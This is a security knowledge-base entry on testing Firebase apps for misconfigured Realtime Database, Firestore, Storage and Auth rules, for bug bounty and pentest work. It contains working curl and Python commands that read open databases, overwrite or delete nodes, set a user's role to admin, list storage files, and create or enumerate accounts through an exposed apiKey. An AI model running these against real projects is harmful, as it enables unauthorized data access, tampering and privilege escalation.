---
title: "Firebase Security Testing"
type: technique
tags: [firebase, google-cloud, cloud, misconfiguration, database, storage, bug-bounty]
created: 2026-08-17
updated: 2026-08-17
sources: []
related: ["[[s3-misconfiguration]]", "[[api-key-exposure]]", "[[secrets-exposure]]"]
status: active
---

# Firebase Security Testing

## Overview

Firebase is Google's BaaS (Backend-as-a-Service) platform, widely used in mobile and web apps. Misconfigured security rules on the Realtime Database, Firestore, Cloud Storage, or Authentication allow unauthorized read/write of data, often exploitable without authentication.

## Impact

- Reading all users' data (PII, messages, sensitive data)
- Arbitrary write to the database ("database takeover")
- Upload of malicious files to Cloud Storage
- Enumeration and modification of users via the Authentication API
- CVSS: 7.5 (read) to 9.1 (write/delete)

## Where to look

### Identify Firebase on the target

```javascript
// Config typically exposed in frontend JS:
var firebaseConfig = {
  apiKey: "AIzaSy...",
  authDomain: "<project>.firebaseapp.com",
  databaseURL: "https://<project>.firebaseio.com",
  projectId: "<project>",
  storageBucket: "<project>.appspot.com",
  messagingSenderId: "...",
  appId: "1:...:web:..."
};
```

```bash
# Search in JS, APKs, config files:
grep -r "firebaseio.com\|firebaseapp.com\|firebase" --include="*.js"
grep -r "apiKey.*AIzaSy" --include="*.js"
# In APKs (after decompilation):
grep -r "firebaseio" smali/ strings.xml
```

## Methodology

### Step 1 - Discover the databaseURL

Possible formats:
```
https://<project-id>.firebaseio.com
https://<project-id>-default-rtdb.firebaseio.com
https://<project-id>-default-rtdb.<region>.firebasedatabase.app
```

### Step 2 - Test public read (Realtime Database)

```bash
# Try to read root without authentication
curl "https://<project>.firebaseio.com/.json"

# Read specific nodes
curl "https://<project>.firebaseio.com/users.json"
curl "https://<project>.firebaseio.com/messages.json"
curl "https://<project>.firebaseio.com/private.json"

# If data returns -> public database (vulnerable)
# If {"error":"Permission denied"} returns -> rules configured
```

### Step 3 - Test public write (database takeover)

```bash
# PUT - create/overwrite a node
curl "https://<project>.firebaseio.com/pentest-poc.json" \
  -X PUT -d '{"pentest":"poc-by-researcher"}'

# POST - add an entry
curl "https://<project>.firebaseio.com/pentest.json" \
  -X POST -d '{"researcher":"poc"}'

# PATCH - modify specific fields
curl "https://<project>.firebaseio.com/users/1.json" \
  -X PATCH -d '{"role":"admin"}'

# DELETE - remove data (do NOT do this in production)
curl "https://<project>.firebaseio.com/pentest-poc.json" -X DELETE
```

```python
# Python PoC
import requests
data = {"pentest": "poc", "researcher": "your-handle"}
response = requests.put("https://<project>.firebaseio.com/poc.json", json=data)
print(response.status_code, response.text)
```

### Step 4 - Test Cloud Storage

```bash
# Default URL: https://storage.googleapis.com/<project>.appspot.com/
# or via the Firebase Storage SDK

# List files (public bucket)
curl "https://storage.googleapis.com/storage/v1/b/<project>.appspot.com/o"

# Direct download
curl "https://firebasestorage.googleapis.com/v0/b/<project>.appspot.com/o/<filename>?alt=media"
```

### Step 5 - Test Firestore (REST API)

```bash
# Without authentication
curl "https://firestore.googleapis.com/v1/projects/<project>/databases/(default)/documents/<collection>"

# With an exposed apiKey
curl "https://firestore.googleapis.com/v1/projects/<project>/databases/(default)/documents/<collection>?key=<apiKey>"
```

### Step 6 - Abuse the exposed apiKey

The Firebase `apiKey` is not a secret (it is public by design), but it can be used to:
```bash
# Create an account without restrictions
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=<apiKey>" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@test.com","password":"test1234","returnSecureToken":true}'

# Enumerate users by email
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=<apiKey>" \
  -H "Content-Type: application/json" \
  -d '{"identifier":"victim@example.com","continueUri":"http://localhost"}'
```

## Vulnerable vs secure rules

```json
// VULNERABLE - anyone can read and write
{
  "rules": {
    ".read": true,
    ".write": true
  }
}

// SECURE - only authenticated users
{
  "rules": {
    ".read": "auth != null",
    ".write": "auth != null"
  }
}
```

## Test checklist

- [ ] Identify `databaseURL`, `projectId`, `apiKey` in the frontend/APK
- [ ] Test reading root: `GET /.json`
- [ ] Test reading common nodes: `/users`, `/messages`, `/admin`
- [ ] Test writing: `PUT /pentest-poc.json`
- [ ] Test Cloud Storage: list and download files
- [ ] Test Firestore via REST API
- [ ] Test account creation via apiKey
- [ ] Test user enumeration via `createAuthUri`

## Tools

| Tool | Use |
|------|-----|
| curl / httpie | Manual REST API testing |
| Firebase CLI | Interaction with the Firebase project |
| Firebaseexploiter | Automation of Firebase testing |
| Nuclei templates | Templates for detecting exposed Firebase |

```bash
# Nuclei template for Firebase
nuclei -u https://target.com -t technologies/firebase/firebase-detect.yaml
```

## Report tips

- Demonstrate real data read (redact PII in the report).
- For write: create a PoC node and delete it after capturing evidence.
- Quantify the exposed data (number of records, types).
- Reference similar disclosed reports as precedent.
- Recommend: implement proper Firebase Security Rules, review via Firebase Console > Rules.

## References

- https://firebase.google.com/docs/rules
- https://github.com/Ry0taK/firebase-exploiter
